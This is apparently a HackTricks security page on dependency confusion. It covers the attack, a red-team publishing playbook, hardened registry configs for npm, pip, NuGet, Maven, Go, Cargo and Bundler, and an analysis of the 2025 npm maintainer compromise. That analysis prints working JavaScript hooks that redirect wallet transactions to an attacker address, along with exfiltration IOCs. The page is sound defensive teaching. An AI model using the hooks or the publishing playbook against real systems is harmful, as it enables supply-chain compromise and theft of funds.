# Dependency Confusion

{{#include ../banners/hacktricks-training.md}}


## Basic Information

Dependency Confusion (a.k.a. substitution attacks) happens when a package manager resolves a dependency name from an unintended, less-trusted registry/source (usually a public registry) instead of the intended private/internal one. This typically leads to the installation of an attacker-controlled package.

Common root causes:
- Typosquatting/misspelling: Importing `reqests` instead of `requests` (resolves from public registry).
- Non-existent/abandoned internal package: Importing `company-logging` that no longer exists internally, so the resolver looks in public registries and finds an attacker’s package.
- Version preference across multiple registries: Importing an internal `company-requests` while the resolver is allowed to also query public registries and prefers the “best”/newer version published publicly by an attacker.

Key idea: If the resolver can see multiple registries for the same package name and is allowed to pick the “best” candidate globally, you’re vulnerable unless you constrain resolution.


## Exploitation

> [!WARNING]
> In all cases, the attacker only needs to publish a malicious package with the same name as the dependency your build resolves from a public registry. Installation-time hooks (e.g., npm scripts) or import-time code paths often give code execution.

### Misspelled & Inexistent

If your project references a library that isn’t available in the private registry, and your tooling falls back to a public registry, an attacker can seed a malicious package with that name in the public registry. Your runners/CI/dev machines will fetch and execute it.

### Unspecified Version / “Best-version” selection across indexes

Developers frequently leave versions unpinned or allow wide ranges. When a resolver is configured with both internal and public indexes, it may select the newest version regardless of source. For internal names like `requests-company`, if the internal index has `1.0.1` but an attacker publishes `1.0.2` to the public registry and your resolver considers both, the public package may win.


## AWS Fix

This vulnerability was found in AWS CodeArtifact (read the details in this blog post). AWS added controls to mark dependencies/feeds as internal vs external so the client won’t fetch “internal” names from upstream public registries.


## Finding Vulnerable Libraries

In the original post about dependency confusion the author looked for thousands of exposed manifests (e.g., `package.json`, `requirements.txt`, lockfiles) to infer internal package names and then published higher-versioned packages to public registries.


## Practical Attacker Playbook (for red teams in authorized tests)

- Enumerate names:
  - Grep repos and CI configs for manifest/lock files and internal namespaces.
  - Look for organization-specific prefixes (e.g., `@company/*`, `company-*`, internal groupIds, NuGet ID patterns, private module paths for Go, etc.).
- Check public registries for availability:
  - If the name is unregistered publicly, register it; if it exists, attempt subdependency hijacking by targeting internal transitive names.
- Publish with precedence:
  - Choose a semver that “wins” (e.g., a very high version) or matches resolver rules.
  - Include minimal install-time execution where applicable (e.g., npm `preinstall`/`install`/`postinstall` scripts). For Python, prefer import-time execution paths, as wheels typically don’t execute arbitrary code on install.
- Exfil control:
  - Ensure outbound is allowed from CI to your controlled endpoint; otherwise use DNS queries or error messages as a side-channel to prove code execution.

> [!CAUTION]
> Always get written authorization, use unique package names/versions for the engagement, and immediately unpublish or coordinate cleanup when testing concludes.


## Defender Playbook (what actually prevents confusion)

High-level strategies that work across ecosystems:
- Use unique internal namespaces and bind them to a single registry.
- Avoid mixing trust levels at resolution time. Prefer a single internal registry that proxies approved public packages instead of giving package managers both internal and public endpoints.
- For managers that support it, map packages to specific sources (no global “best-version” across registries).
- Pin and lock:
  - Use lockfiles that record the resolved registry URLs (npm/yarn/pnpm) or use hash/attestation pinning (pip `--require-hashes`, Gradle dependency verification).
- Block public fallback for internal names at the registry/network layer.
- Reserve your internal names in public registries when feasible to prevent future squat.


## Ecosystem Notes and Secure Config Snippets

Below are pragmatic, minimal configs to reduce or eliminate dependency confusion. Prefer enforcing these in CI and developer environments.

### JavaScript/TypeScript (npm, Yarn, pnpm)

- Use scoped packages for all internal code and pin the scope to your private registry.
- Keep installs immutable in CI (npm lockfile, `yarn install --immutable`).

.npmrc (project-level)
```
# Bind internal scope to private registry; do not allow public fallback for @company/*
@company:registry=https://registry.corp.example/npm/
# Always authenticate to the private registry
//registry.corp.example/npm/:_authToken=${NPM_TOKEN}
strict-ssl=true
```

package.json (for internal package)
```
{
  "name": "@company/api-client",
  "version": "1.2.3",
  "private": false,
  "publishConfig": {
    "registry": "https://registry.corp.example/npm/",
    "access": "restricted"
  }
}
```

Yarn Berry (.yarnrc.yml)
```
npmScopes:
  company:
    npmRegistryServer: "https://registry.corp.example/npm/"
    npmAlwaysAuth: true
# CI should fail if lockfile would change
enableImmutableInstalls: true
```

Operational tips:
- Only publish internal packages within the `@company` scope.
- For third-party packages, allow public registry via your private proxy/mirror, not directly from clients.
- Consider enabling npm package provenance for public packages you publish to increase traceability (doesn’t by itself prevent confusion).

### Python (pip / Poetry)

Core rule: Don’t use `--extra-index-url` to mix trust levels. Either:
- Expose a single internal index that proxies and caches approved PyPI packages, or
- Use explicit index selection and hash pinning.

pip.conf
```
[global]
index-url = https://pypi.corp.example/simple
# Disallow source distributions when possible
only-binary = :all:
# Lock with hashes generated via pip-tools
require-hashes = true
```

Generate hashed requirements with pip-tools:
```
# From pyproject.toml or requirements.in
pip-compile --generate-hashes -o requirements.txt
pip install --require-hashes -r requirements.txt
```

If you must reach public PyPI, do it via your internal proxy and maintain an explicit allowlist there. Avoid `--extra-index-url` in CI.

### .NET (NuGet)

Use Package Source Mapping to tie package ID patterns to explicit sources and prevent resolution from unexpected feeds.

nuget.config
```
<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <packageSources>
    <clear />
    <add key="nuget.org" value="https://api.nuget.org/v3/index.json" />
    <add key="corp" value="https://nuget.corp.example/v3/index.json" />
  </packageSources>
  <packageSourceMapping>
    <packageSource key="nuget.org">
      <package pattern="*" />
    </packageSource>
    <packageSource key="corp">
      <package pattern="Company.*" />
      <package pattern="Internal.Utilities" />
    </packageSource>
  </packageSourceMapping>
</configuration>
```

### Java (Maven/Gradle)

Maven settings.xml (mirror all to internal; disallow ad-hoc repos in POMs via Enforcer):
```
<settings>
  <mirrors>
    <mirror>
      <id>internal-mirror</id>
      <mirrorOf>*</mirrorOf>
      <url>https://maven.corp.example/repository/group</url>
    </mirror>
  </mirrors>
</settings>
```

Add Enforcer to ban repositories declared in POMs and force usage of your mirror:
```
<plugin>
  <groupId>org.apache.maven.plugins</groupId>
  <artifactId>maven-enforcer-plugin</artifactId>
  <version>3.6.1</version>
  <executions>
    <execution>
      <id>enforce-no-repositories</id>
      <goals><goal>enforce</goal></goals>
      <configuration>
        <rules>
          <requireNoRepositories />
        </rules>
      </configuration>
    </execution>
  </executions>
</plugin>
```

Gradle: Centralize and lock dependencies.
- Enforce repositories in `settings.gradle(.kts)` only:
```
dependencyResolutionManagement {
  repositoriesMode = RepositoriesMode.FAIL_ON_PROJECT_REPOS
  repositories {
    maven { url = uri("https://maven.corp.example/repository/group") }
  }
}
```
- Enable dependency verification (checksums/signatures) and commit `gradle/verification-metadata.xml`.

### Go Modules

Configure private modules so the public proxy and checksum DB aren’t used for them.

```
# Use corporate proxy first, then public proxy as fallback
export GOPROXY=https://goproxy.corp.example,https://proxy.golang.org
# Mark private paths to skip proxy and checksum db
export GOPRIVATE=*.corp.example.com,github.com/your-org/*
export GONOSUMDB=*.corp.example.com,github.com/your-org/*
```

### Rust (Cargo)

Replace crates.io with an approved internal mirror or vendor directory for builds; do not allow arbitrary public fallback.

.cargo/config.toml
```
[source.crates-io]
replace-with = "corp-mirror"

[source.corp-mirror]
registry = "https://crates-mirror.corp.example/index"
```

For publishing, be explicit with `--registry` and keep credentials scoped to the target registry.

### Ruby (Bundler)

Use source blocks and disable multisource Gemfiles so gems come only from the intended repository.

Gemfile
```
source "https://gems.corp.example"

source "https://rubygems.org" do
  gem "rails"
  gem "pg"
end

source "https://gems.corp.example" do
  gem "company-logging"
end
```

Enforce at config level:
```
bundle config set disable_multisource true
```


## CI/CD and Registry Controls That Help

- Private registry as a single ingress:
  - Use Artifactory/Nexus/CodeArtifact/GitHub Packages/Azure Artifacts as the only endpoint developers/CI can reach.
  - Implement block/allow rules so internal namespaces never resolve from upstream public sources.
- Lockfiles are immutable in CI:
  - npm: commit `package-lock.json`, use `npm ci`.
  - Yarn: commit `yarn.lock`, use `yarn install --immutable`.
  - Python: commit hashed `requirements.txt`, enforce `--require-hashes`.
  - Gradle: commit `verification-metadata.xml` and fail on unknown artifacts.
- Outbound egress control: block direct access from CI to public registries except via the approved proxy.
- Name reservation: pre-register your internal names/namespaces in public registries where supported.
- Package provenance / attestations: when publishing public packages, enable provenance/attestations to make tampering more detectable downstream.


## Maintainer account takeover and malicious package updates (npm) – pivot to browser API monkey‑patching

A frequent real-world supply chain pattern is not “confusion,” but compromise of a legitimate maintainer account to ship malicious patch/minor versions that consumers auto-adopt. In September 2025, attackers phished an npm maintainer (qix) using a look‑alike domain and, after takeover, published trojanized versions of very popular packages (e.g., debug, chalk, ansi-regex, supports-color, strip-ansi). The injected logic targeted browser builds and transparently monkey‑patched network and wallet APIs to hijack crypto transactions.

Key techniques to understand and detect:

- Initial access via maintainer phishing
  - Look‑alike domain: `npmjs.help` impersonating npm support; 2FA “update” lure; credentials exfiltrated to `websocket-api2.publicvm.com/images/jpg-to-png.php`.
  - Lesson: registries are identity systems; protect maintainer accounts with phishing-resistant MFA and token hygiene.

- Ecosystem persistence via patch/minor releases
  - Attackers pushed small semver bumps; fresh installs during the window resolved the poisoned versions through normal semver rules and updated lockfiles.
  - Blast radius minimization: time‑boxed poisoning window narrowed detection but still captured high-velocity adopters.

- Browser-layer execution and API hooks
  - When affected packages were bundled for the web, the malicious `index.js` executed client-side and hooked fetch/XMLHttpRequest and wallet providers (EVM `window.ethereum`, Solana, etc.), inspecting responses/DOM and rewriting destinations or approvals to attacker addresses before signature prompts.
  - High impact for dApps and web apps interacting with wallets; see also general Web3 DApp risks in dApps-DecentralizedApplications.md.

Minimal examples of the injected technique (for education/detection):

Hooking fetch:
```
(function(){
  const origFetch = window.fetch;
  window.fetch = async function(...args){
    const res = await origFetch.apply(this, args);
    try {
      const clone = res.clone();
      const text = await clone.text();
      // Inspect and optionally rewrite indicators inside text
      // e.g., replace wallet addresses or approval targets
      // const patched = text.replace(/0x[a-fA-F0-9]{40}/g, ATK_ADDR);
    } catch(e) {}
    return res;
  };
})();
```

Hooking XMLHttpRequest:
```
(function(){
  const origOpen = XMLHttpRequest.prototype.open;
  const origSend = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.open = function(m,u,async){
    this._u = u; return origOpen.apply(this, arguments);
  };
  XMLHttpRequest.prototype.send = function(body){
    this.addEventListener('readystatechange', function(){
      if (this.readyState === 4) {
        try {
          const txt = this.responseText;
          // Inspect txt for wallet params and rewrite UI/DOM accordingly
        } catch(e) {}
      }
    });
    return origSend.apply(this, arguments);
  };
})();
```

Hooking EVM provider (MetaMask-compatible):
```
(function(){
  if (!window.ethereum || !window.ethereum.request) return;
  const ATK_ADDR = '0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef';
  const origReq = window.ethereum.request.bind(window.ethereum);
  window.ethereum.request = async (args) => {
    try {
      if (args && args.method === 'eth_sendTransaction' && Array.isArray(args.params)) {
        const tx = args.params[0] || {};
        if (tx.to) tx.to = ATK_ADDR; // DESTINATION HIJACK
        // Other manipulations: value, data (approve/permit), chainId, etc.
        args = { ...args, params: [tx] };
      }
    } catch(e) {}
    return origReq(args);
  };
})();
```

Solana-like provider patterns (pseudocode):
```
if (window.solana?.signAndSendTransaction) {
  const orig = window.solana.signAndSendTransaction.bind(window.solana);
  window.solana.signAndSendTransaction = async (tx, opts) => {
    try { /* modify tx.message.instructions to redirect destination */ } catch(e){}
    return orig(tx, opts);
  };
}
```

Operational exposure and scoping
- Affected primarily browser-shipped bundles that included a compromised package during the poisoning window and wrote a lockfile then.
- Server-only consumers were less impacted because the injected logic focused on browser APIs and wallet interfaces.

Actionable detection and response
- Scope by time and lockfiles:
  - Check CI/local logs for installs between ~09:00–11:30 ET on 2025‑09‑08; verify lockfile creation times and artifact build times.
- Verify versions resolved in your tree:
```
# npm
npm ls debug chalk ansi-regex ansi-styles supports-color strip-ansi wrap-ansi

# yarn / pnpm
yarn why debug chalk ansi-regex
pnpm list --depth 10 | grep -E "(debug|chalk|ansi|strip-ansi|wrap-ansi)@"
```
- Hunt for IOCs in built assets (dist/build):
```
# Exfil domain and API hooks in production bundles
rg -n "websocket-api2\.publicvm\.com|npmjs\.help|window\.ethereum|XMLHttpRequest|\bfetch\b" dist/ build/ public/
```
- Containment & recovery:
  - Pin/rollback to known-good versions; delete lockfile and node_modules, then reinstall from a trusted mirror.
  - Purge npm caches and rebuild clean:
```
npm cache clean --force
rm -rf node_modules package-lock.json
npm ci
```
- Monitor:
  - Block/monitor egress to the exfil domain; review on‑chain approvals/transactions for unexpected addresses if your app handles crypto.

Indicators
- Phish domain: `npmjs.help`
- Credential exfil: `websocket-api2.publicvm.com/images/jpg-to-png.php`
